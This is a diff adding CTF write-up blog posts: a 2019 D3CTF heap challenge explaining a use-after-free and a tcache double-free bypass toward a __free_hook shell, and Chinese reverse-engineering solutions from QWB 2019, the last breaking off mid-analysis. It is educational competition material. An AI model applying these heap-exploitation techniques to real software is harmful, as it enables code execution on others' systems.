@@ -71,6 +71,674 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-2019d3ctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/11/29/2019d3ctf/" class="article-date">
+  <time class="dt-published" datetime="2019-11-29T03:07:10.000Z" itemprop="datePublished">2019-11-29</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2019/11/29/2019d3ctf/">2019 D3CTF</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="new-heap"><a href="#new-heap" class="headerlink" title="new_heap"></a>new_heap</h2><p>A really cumbersome heap pwn and got only 2 solved at last.</p>
+<p>The vulnerabilities is easy to dig out. An obvious “use after free” in free procedure.</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_B42</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index:&quot;</span>, a2);</span><br><span class="line">  idx = <span class="built_in">input_int</span>();</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt; <span class="number">0</span> || idx &gt; <span class="number">17</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;index out of range&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span> *)note[idx]);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;done&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>However, there are no mehods for editing or showing. Worse still, our operations is limited to 18 times and chunksize must less than 0x78 (fastbin&#x2F;tache).</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( result &lt;= <span class="number">0x78</span> )</span><br><span class="line">&#123;</span><br><span class="line">  note[idx] = (__int64)<span class="built_in">malloc</span>(result);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, (<span class="type">void</span> *)note[idx], (<span class="type">unsigned</span> <span class="type">int</span>)size);</span><br><span class="line">  result = <span class="built_in">puts</span>(<span class="string">&quot;done&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Ok, the idea is simple, no showing or editing methods means we must construct a freed fake FD pointer manually, first write <code>_IO_2_1_stdout</code> for leaking and later write <code>__free_hook</code> for executing <code>system(&quot;/bin/sh&quot;)</code>. So the keypoint is to cause chunk overlapping.</p>
+<p>Before that, notice there a <code>getchar</code> in main function without <code>setbuf(stdin,0)</code>.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">&#123;</span><br><span class="line">  a1 = (__int64)<span class="string">&quot;sure?&quot;</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;sure?&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( getchar() == <span class="string">&#x27;y&#x27;</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>As a result, <code>putchar</code> wil invoke functions to create a large buffer in main_arena heap, and call <code>malloc_consolidate</code> to merge fastbins.</p>
+<p>Let me talk about potential ideas behind:</p>
+<ol>
+<li>double free is impossible, libc-2.29 have added accurate detections for heap exploiting, so the technique such as <a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_dup.c">tcache dup</a>, <a target="_blank" rel="noopener" href="https://changochen.github.io/2018-11-26-bctf-2018.html">house of atum</a> are useless.</li>
+<li>because of the limitations on user’s operation, traditional unlink or small-bin attack, like the similar solutions of <a target="_blank" rel="noopener" href="https://github.com/pr0cf5/CTF-writeups/tree/master/2019/hitcon">lazyhouse</a> may be  exhaust the opportunities.</li>
+<li>we can use the traditional fastbin attack but the number limitations is really annoying.</li>
+<li>The existence of <code>getchar</code> hint that we must fill tache list to allocate fastbin for using it.</li>
+</ol>
+<p>My solution is straight and has a little different with <code>house of atum</code> because of the  double tcache check.</p>
+<p>However, fastbins only limit the <code>FastbinY[i]</code> cannot repeat, it inspired me.</p>
+<p>Frist, normal free to obtain a fastbin like that.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(0x20)     fastbin[0]: 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0x0</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0x0</span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x55ce37e24680 --&gt; 0x0</span><br><span class="line">(0x90)     fastbin[7]: 0x0</span><br><span class="line">(0xa0)     fastbin[8]: 0x0</span><br><span class="line">(0xb0)     fastbin[9]: 0x0</span><br><span class="line">                  top: 0x55ce37e24700 (size : 0x20900)</span><br><span class="line">       last_remainder: 0x0 (size : 0x0)</span><br><span class="line">            unsortbin: 0x0</span><br><span class="line">(0x80)   tcache_entry[6](7): 0x55ce37e24610 --&gt; 0x55ce37e24590 --&gt; 0x55ce37e24510 --&gt; 0x55ce37e243e0 --&gt; 0x55ce37e24360 --&gt; 0x55ce37e242e0 --&gt; 0x55ce37e24260</span><br></pre></td></tr></table></figure>
+
+<p>Then, we can simply <code>malloc(0x78)</code> allocated 0x55ce37e24610  and free 0x55ce37e24680 again, like behind.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(0x20)     fastbin[0]: 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0x0</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0x0</span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x5646dc407680 --&gt; 0x5646dc407590 (size error (0x5646dc407010)) --&gt; 0x6161616161616161 (invaild memory)</span><br><span class="line">(0x90)     fastbin[7]: 0x0</span><br><span class="line">(0xa0)     fastbin[8]: 0x0</span><br><span class="line">(0xb0)     fastbin[9]: 0x0</span><br><span class="line">                  top: 0x5646dc407700 (size : 0x20900)</span><br><span class="line">       last_remainder: 0x0 (size : 0x0)</span><br><span class="line">            unsortbin: 0x0</span><br><span class="line">(0x80)   tcache_entry[6](7): 0x5646dc407690 (overlap chunk with 0x5646dc407680(freed) )</span><br></pre></td></tr></table></figure>
+
+<p>That’s the point, freed 0x55ce37e24680  chunk will insert in the head of <code>tcache_entry</code> and do not check the chunks behind. That’s to say we can bypass the double tcache check. Like the same effect with <code>house of atum</code>, fastbin chunk’s next points will point to the next tcache. Now we get a large chunk(&gt;0x400) via  <code>putchar</code> will let them into unsortedbin.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(0x20)     fastbin[0]: 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0x0</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0x0</span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x0</span><br><span class="line">(0x90)     fastbin[7]: 0x0</span><br><span class="line">(0xa0)     fastbin[8]: 0x0</span><br><span class="line">(0xb0)     fastbin[9]: 0x0</span><br><span class="line">                  top: 0x55ce37e25690 (size : 0x1f970)</span><br><span class="line">       last_remainder: 0x0 (size : 0x0)</span><br><span class="line">            unsortbin: 0x0</span><br><span class="line">(0x080)  smallbin[ 6]: 0x55ce37e24430</span><br><span class="line">(0x80)   tcache_entry[6](6): 0x55ce37e24590 --&gt; 0x55ce37e24510 --&gt; 0x55ce37e243e0 (overlap chunk with 0x55ce37e24430(freed) )</span><br></pre></td></tr></table></figure>
+
+<p>Next steps are inside, we can reuse unsorted bin for chunk overlapping and brute force to leak libc and getshell. In the process, be careful about the limitation on the chunk numbers.</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/11/29/2019d3ctf/" data-id="cuidNzOFGUOD-niJ-3f4kzhDk" data-title="2019 D3CTF" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-qwb2019-re" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/11/22/qwb2019-re/" class="article-date">
+  <time class="dt-published" datetime="2019-11-22T02:46:12.000Z" itemprop="datePublished">2019-11-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2019/11/22/qwb2019-re/">qwb2019-re</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="2019-re-强网先锋"><a href="#2019-re-强网先锋" class="headerlink" title="2019 re 强网先锋"></a>2019 re 强网先锋</h1><p>一个简单的base64，签到题</p>
+<style>.fqwwnwqrmgdm{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999333-27.png" class="fqwwnwqrmgdm" alt="img">
+
+<p>解码即可：flag{mafakuailaiqiandaob}</p>
+<h1 id="2019-re-设备固件"><a href="#2019-re-设备固件" class="headerlink" title="2019 re 设备固件"></a>2019 re 设备固件</h1><p>题目给了一个完整的文件系统镜像和一个elf文件，根据readme中所述使用以下命令模拟运行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mipsel -M malta -hda openwrt-malta-le-root.ext4 -kernel openwrt-malta-le-vmlinux.elf -nographic -append &quot;root=/dev/sda console=tty50&quot; </span><br></pre></td></tr></table></figure>
+
+<p>而后在&#x2F;bin中找到目标二进制文件hello：</p>
+<style>.kxvisdigilvl{zoom:80%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-1.png" class="kxvisdigilvl" alt="img">
+
+<p>运行：</p>
+<style>.jttorjgypqeu{zoom:50%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-2.png" class="jttorjgypqeu" alt="img">
+
+<p>但是这个二进制文件在系统里面，没办法拿出来用ida查看，先想想办法把hello文件提取出来</p>
+<p>采用在宿主机上挂载 ext4 镜像的方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 1. 创建一个目录作为挂载点sudo mkdir /mnt/openwrt-root</span><br><span class="line"></span><br><span class="line"># 2. 使用 loop 设备挂载 ext4 镜像文件sudo mount -o loop openwrt-malta-le-root.ext4 /mnt/openwrt-root</span><br></pre></td></tr></table></figure>
+
+<p>而后镜像文件的所有内容都暴露在 <code>/mnt/openwrt-root</code> 目录下</p>
+<style>.woixhrpwhrlq{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-3.png" class="woixhrpwhrlq" alt="img">
+
+<p>找到hello文件完成提取</p>
+<style>.fsohvjulcndn{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-4.png" class="fsohvjulcndn" alt="img">
+
+<p>首先使用file命令分析：</p>
+<style>.mmtbopxtgfet{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-5.png" class="mmtbopxtgfet" alt="img">
+
+<p>32位mips架构</p>
+<p>放入ida内分析：</p>
+<style>.qbibsuddstti{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-6.png" class="qbibsuddstti" alt="img">
+
+<p>可以看到首先将输入的用户名放入v7的前40个字节中，密码放入后40个字节中，而后进入函数sub_400D48进行判断，该函数主要有两个部分，分别是函数sub_400C6C有用于验证用户名是否正确，函数sub_400CC4用于验证密码是否正确</p>
+<style>.hkydugmewmmi{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-7.png" class="hkydugmewmmi" alt="img">
+
+<p>先看函数sub_400C6C</p>
+<style>.rytnxgwyftiu{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-8.png" class="rytnxgwyftiu" alt="img">
+
+<p>很容易看出来该用户名就是直接确定了<code>dd772</code></p>
+<p>只有<code>dd772</code>才能令最终v1&#x3D;&#x3D;0</p>
+<p>而后看函数sub_400CC4：</p>
+<style>.vstdfktzbsjt{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-9.png" class="vstdfktzbsjt" alt="img">
+
+<p>主要逻辑在sub_400800，该函数主要是模拟虚拟机执行，有以下操作：</p>
+<table>
+<thead>
+<tr>
+<th>操作码</th>
+<th>符号</th>
+<th>num1</th>
+<th>num2</th>
+<th>行为</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0x01</td>
+<td>add</td>
+<td>寄存器</td>
+<td>寄存器</td>
+<td>num1+&#x3D;num2</td>
+</tr>
+<tr>
+<td>0x02</td>
+<td>sub</td>
+<td>寄存器</td>
+<td>寄存器</td>
+<td>num1-&#x3D;num2</td>
+</tr>
+<tr>
+<td>0x03</td>
+<td>cmp</td>
+<td>寄存器</td>
+<td>寄存器</td>
+<td>ZF&#x3D;(num1&#x3D;&#x3D;num2?1:2)</td>
+</tr>
+<tr>
+<td>0x04</td>
+<td>jmp</td>
+<td>立即数</td>
+<td>-</td>
+<td>IP+&#x3D;num1</td>
+</tr>
+<tr>
+<td>0x05</td>
+<td>mov</td>
+<td>寄存器</td>
+<td>寄存器</td>
+<td>num1&#x3D;num2</td>
+</tr>
+<tr>
+<td>0x06</td>
+<td>-</td>
+<td>寄存器</td>
+<td>-</td>
+<td>num1&#x3D;IP</td>
+</tr>
+<tr>
+<td>0x07</td>
+<td>-</td>
+<td>寄存器</td>
+<td>-</td>
+<td>IP&#x3D;num1</td>
+</tr>
+<tr>
+<td>0x08</td>
+<td>-</td>
+<td>寄存器</td>
+<td>立即数</td>
+<td>num1&#x3D;nmu2</td>
+</tr>
+<tr>
+<td>0x09</td>
+<td>ret</td>
+<td>-</td>
+<td>-</td>
+<td>返回 0</td>
+</tr>
+<tr>
+<td>0x0A</td>
+<td>load</td>
+<td>寄存器</td>
+<td>寄存器</td>
+<td>num1&#x3D;tran_pass[num2]</td>
+</tr>
+<tr>
+<td>0x0B</td>
+<td>load</td>
+<td>寄存器</td>
+<td>寄存器</td>
+<td>num1&#x3D;const_ARR[num2]</td>
+</tr>
+<tr>
+<td>0x0C</td>
+<td>xor</td>
+<td>寄存器</td>
+<td>寄存器</td>
+<td>num1^&#x3D;num2</td>
+</tr>
+<tr>
+<td>0x0D</td>
+<td>imul</td>
+<td>寄存器</td>
+<td>寄存器</td>
+<td>num1*&#x3D;num2</td>
+</tr>
+<tr>
+<td>0x0E</td>
+<td>DIV</td>
+<td>寄存器</td>
+<td>寄存器</td>
+<td>num1&#x2F;&#x3D;num2</td>
+</tr>
+<tr>
+<td>0x0F</td>
+<td>shl</td>
+<td>寄存器</td>
+<td>寄存器</td>
+<td>num1&lt;&lt;&#x3D;num2</td>
+</tr>
+<tr>
+<td>0x10</td>
+<td>shr</td>
+<td>寄存器</td>
+<td>寄存器</td>
+<td>num1&gt;&gt;&#x3D;num2</td>
+</tr>
+<tr>
+<td>0xFF</td>
+<td>ret</td>
+<td>-</td>
+<td>-</td>
+<td>返回 1</td>
+</tr>
+</tbody></table>
+<p>然后指令就是地址4110c0 所指向的内容：</p>
+<style>.usnvmkxvnfsh{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-10.png" class="usnvmkxvnfsh" alt="img">
+
+<p>即：</p>
+<table>
+<thead>
+<tr>
+<th>地址</th>
+<th>数据</th>
+<th>指令</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>004110c0</td>
+<td>08 00 00 00 20 00</td>
+<td>mov R0, 0x20</td>
+</tr>
+<tr>
+<td>004110c6</td>
+<td>08 00 01 00 00 00</td>
+<td>mov R1, 0x00</td>
+</tr>
+<tr>
+<td>004110cc</td>
+<td>08 00 02 00 01 00</td>
+<td>mov R2, 0x01</td>
+</tr>
+<tr>
+<td>004110d2</td>
+<td>03 00 01 00 00 00</td>
+<td>cmp R1, R0</td>
+</tr>
+<tr>
+<td>004110d8</td>
+<td>04 01 16 00 00 00</td>
+<td>jz +0x16</td>
+</tr>
+<tr>
+<td>004110de</td>
+<td>08 00 0b 00 00 00</td>
+<td>mov RB, 0x00</td>
+</tr>
+<tr>
+<td>004110e4</td>
+<td>08 00 0c 00 00 00</td>
+<td>mov RC, 0x00</td>
+</tr>
+<tr>
+<td>004110ea</td>
+<td>01 00 0c 00 0b 00</td>
+<td>add RC, RB</td>
+</tr>
+<tr>
+<td>004110f0</td>
+<td>03 00 0b 00 01 00</td>
+<td>cmp RB, R1</td>
+</tr>
+<tr>
+<td>004110f6</td>
+<td>01 00 0b 00 02 00</td>
+<td>add RB, R2</td>
+</tr>
+<tr>
+<td>004110fc</td>
+<td>04 02 fc ff 00 00</td>
+<td>jnz -0x04</td>
+</tr>
+<tr>
+<td>00411102</td>
+<td>08 00 03 00 08 00</td>
+<td>mov R3, 0x08</td>
+</tr>
+<tr>
+<td>00411108</td>
+<td>08 00 04 00 06 00</td>
+<td>mov R4, 0x06</td>
+</tr>
+<tr>
+<td>0041110e</td>
+<td>08 00 09 00 10 00</td>
+<td>mov R9, 0x10</td>
+</tr>
+<tr>
+<td>411114</td>
+<td>0f 00 09 00 03 00</td>
+<td>shl R9, R3</td>
+</tr>
+<tr>
+<td>0041111a</td>
+<td>08 00 0a 00 24 00</td>
+<td>mov Ra, 0x24</td>
+</tr>
+<tr>
+<td>411120</td>
+<td>01 00 09 00 0a 00</td>
+<td>add R9, Ra</td>
+</tr>
+<tr>
+<td>411126</td>
+<td>01 00 09 00 0c 00</td>
+<td>add R9, RB</td>
+</tr>
+<tr>
+<td>0041112c</td>
+<td>0a 00 05 00 01 00</td>
+<td>LOAD R5, R1 &#x2F;&#x2F;_pass</td>
+</tr>
+<tr>
+<td>411132</td>
+<td>0d 00 05 00 09 00</td>
+<td>imul R5, R9</td>
+</tr>
+<tr>
+<td>411138</td>
+<td>05 00 06 00 05 00</td>
+<td>mov R6, R5</td>
+</tr>
+<tr>
+<td>0041113e</td>
+<td>10 00 06 00 04 00</td>
+<td>shr R6, R4</td>
+</tr>
+<tr>
+<td>411144</td>
+<td>0b 00 07 00 01 00</td>
+<td>LOAD R7, R1 &#x2F;&#x2F;_const</td>
+</tr>
+<tr>
+<td>0041114a</td>
+<td>03 00 06 00 07 00</td>
+<td>cmp R6, R7</td>
+</tr>
+<tr>
+<td>411150</td>
+<td>01 00 01 00 02 00</td>
+<td>add R1, R2</td>
+</tr>
+<tr>
+<td>411156</td>
+<td>04 01 e9 ff 00 00</td>
+<td>jz -0x17</td>
+</tr>
+<tr>
+<td>0041115c</td>
+<td>04 02 01 00 00 00</td>
+<td>jnz +1</td>
+</tr>
+<tr>
+<td>411162</td>
+<td>ff 00 00 00 00 00</td>
+<td>ret 1</td>
+</tr>
+<tr>
+<td>411168</td>
+<td>09 00 00 00 00 00</td>
+<td>ret 0</td>
+</tr>
+<tr>
+<td>0041116e</td>
+<td>ff 00 00 00 00 00</td>
+<td>ret 1</td>
+</tr>
+</tbody></table>
+<p>最后推出算式<code>const_ARR[i]=(((0x10&lt;&lt;8)+0x24+ (i) )*tran_pass[i])&gt;&gt;6</code></p>
+<p>但是这种直接分析太麻烦，也可以使用动态调试（推荐使用）</p>
+<p>很容易就能看出算法为<code>const_ARR[i] = (input[i] * out) &gt;&gt; 6,其中out的初值为0x1024，out += 1+i</code></p>
+<p>爆破一下password：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">flagenc = [<span class="number">0x00000C5B</span>, <span class="number">0x00000CDD</span>, <span class="number">0x00000D1F</span>, <span class="number">0x000018C0</span>, <span class="number">0x000018C6</span>, <span class="number">0x00000C26</span>, <span class="number">0x00000E72</span>, <span class="number">0x00000DF7</span>, <span class="number">0x000019B1</span>, <span class="number">0x00000D41</span>, <span class="number">0x00000D08</span>, <span class="number">0x0000191C</span>, <span class="number">0x00000CD9</span>, <span class="number">0x00000EB1</span>, <span class="number">0x00000CEE</span>, <span class="number">0x00001A78</span>, <span class="number">0x00000D8B</span>, <span class="number">0x00000D99</span>, <span class="number">0x00000D64</span>, <span class="number">0x00000CED</span>, <span class="number">0x000019F8</span>, <span class="number">0x00000E61</span>, <span class="number">0x00001A7F</span>, <span class="number">0x00001AE7</span>, <span class="number">0x00000F26</span>, <span class="number">0x00001B34</span>, <span class="number">0x00001AD0</span>, <span class="number">0x00000D7C</span>, <span class="number">0x00000FC9</span>, <span class="number">0x00000E7E</span>, <span class="number">0x00001C0E</span>, <span class="number">0x00001BAE</span>]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">out = <span class="number">0x1024</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flagenc)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">                <span class="keyword">if</span>(((j * out) &gt;&gt; <span class="number">6</span>) == flagenc[i]):</span><br><span class="line">                        flag += <span class="built_in">chr</span>(j)</span><br><span class="line">                        <span class="built_in">print</span>(flag)</span><br><span class="line">        out += (i + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#134bb097e43b292f4431b6cd8db194db</span></span><br></pre></td></tr></table></figure>
+
+<p>所以用户名就是dd772,密码就是134bb097e43b292f4431b6cd8db194db</p>
+<p>得到flag</p>
+<style>.tqtfgmnopuqh{zoom:50%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-11.png" class="tqtfgmnopuqh" alt="img">
+
+<h1 id="2019-re-Justre"><a href="#2019-re-Justre" class="headerlink" title="2019 re Justre"></a>2019 re Justre</h1><p>A1BAAAAAAAAAAAAAAAAAAAAAAA</p>
+<p>前8个A1BAAAAA为一组  xmm5中有4个</p>
+<p>第二个8个，先判断是否为数字，不是的话判断是否为大写字母，是数字下面的标点以及大写字母的话v14&#x3D;16*（该字符-7），   是大写字母下面的字符的话把v14&#x3D;0，是数字前面的符号的话v14&#x3D;16*该字符</p>
+<p>可能是两个字节两个字节取，如果第二个是数字则将v10&#x3D;v14+该数字，如果是大写字母v10&#x3D;v14+该字符-55</p>
+<p>然后还有很长的一段的运算两种情况都需要进行</p>
+<p>AA 复制16份然后每八个一份放入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">.rdata:00404340 xmmword_404340 xmmword 3000000020000000100000000h</span><br><span class="line">.rdata:00404340                                         ; DATA XREF: sub_401610+151↑r</span><br><span class="line">.rdata:00404350 xmmword_404350 xmmword 4000000040000000400000004h</span><br><span class="line">.rdata:00404350                                         ; DATA XREF: sub_401610+190↑r</span><br><span class="line">.rdata:00404360 xmmword_404360 xmmword 8000000080000000800000008h</span><br><span class="line">.rdata:00404360                                         ; DATA XREF: sub_401610+1B8↑r</span><br><span class="line">.rdata:00404370 xmmword_404370 xmmword 0C0000000C0000000C0000000Ch</span><br><span class="line">.rdata:00404370                                         ; DATA XREF: sub_401610+1DA↑r</span><br><span class="line">.rdata:00404380 xmmword_404380 xmmword 1010101010101010101010101010101h</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.data:00405018 xmmword_405018 xmmword 3D5E1084FD0E0A2CE98FBCC77AB29357h</span><br><span class="line">.data:00405018                                         ; DATA XREF: sub_401610+166↑r</span><br><span class="line">.data:00405018                                         ; sub_401610+189↑w</span><br><span class="line">.data:00405018                                         ; sub_401610:loc_401814↑r</span><br><span class="line">.data:00405018                                         ; sub_401610+212↑w</span><br><span class="line">.data:00405018                                         ; sub_401610:loc_401831↑r</span><br><span class="line">.data:00405018                                         ; sub_401610+259↑o</span><br><span class="line">.data:00405028 xmmword_405028 xmmword 3D4F7424ED150C28FB39F0A384C9FB26h</span><br><span class="line">.data:00405028                                         ; DATA XREF: sub_401610+17B↑r</span><br><span class="line">.data:00405028                                         ; sub_401610+1B1↑w</span><br><span class="line">.data:00405038 xmmword_405038 xmmword 5715BAFE28EA503D065C0BEB3CCE6C2Ah</span><br><span class="line">.data:00405038                                         ; DATA XREF: sub_401610+19B↑r</span><br><span class="line">.data:00405038                                         ; sub_401610+1ED↑w</span><br><span class="line">.data:00405048 xmmword_405048 xmmword 63184D41064DEFECAF152E2F3D4F842Bh</span><br></pre></td></tr></table></figure>
+
+<p>AA 先被扩展为AAAAAAAA 然后再被扩展为相同的四个整数，然后每个再*01010101</p>
+<p>xmm4 &#x3D; (AA*4)*01010101</p>
+<p>xmm5 &#x3D; A1BAAAAA*4</p>
+<p>状态变量1 0x405018 更新：</p>
+<p>xmm1&#x3D;(xmm4 + 0x405018)</p>
+<p>xmm2 &#x3D; (xmm5 + 0x404340)</p>
+<p> 0x405018 &#x3D; xmm2 ^ xmm1</p>
+<p>状态变量2 0x405028更新：</p>
+<p>xmm1 &#x3D; (xmm4 + 0x405028)</p>
+<p>xmm2 &#x3D; (0x404340 + 0x404350 + xmm5)</p>
+<p>0x405028 &#x3D; xmm2 ^ xmm1</p>
+<p>状态变量3 0x405038更新：</p>
+<p>xmm1 &#x3D; (xmm4 + 0x405038)</p>
+<p>xmm2 &#x3D; (0x404340 + 0x404360 + xmm5)</p>
+<p>0x405038 &#x3D; xmm2 ^ xmm1</p>
+<p>状态变量4 0x405048更新：</p>
+<p>xmm4 &#x3D; xmm4 + 0x405048</p>
+<p>xmm1 &#x3D; (0x404340 + 0x404370 + xmm5)</p>
+<p>0x405048 &#x3D; xmm4 ^ xmm1</p>
+<p>v2 &#x3D; A1BAAAAA v10 &#x3D; AA</p>
+<p>v19&#x3D;16</p>
+<p>while（v19&lt;24）{</p>
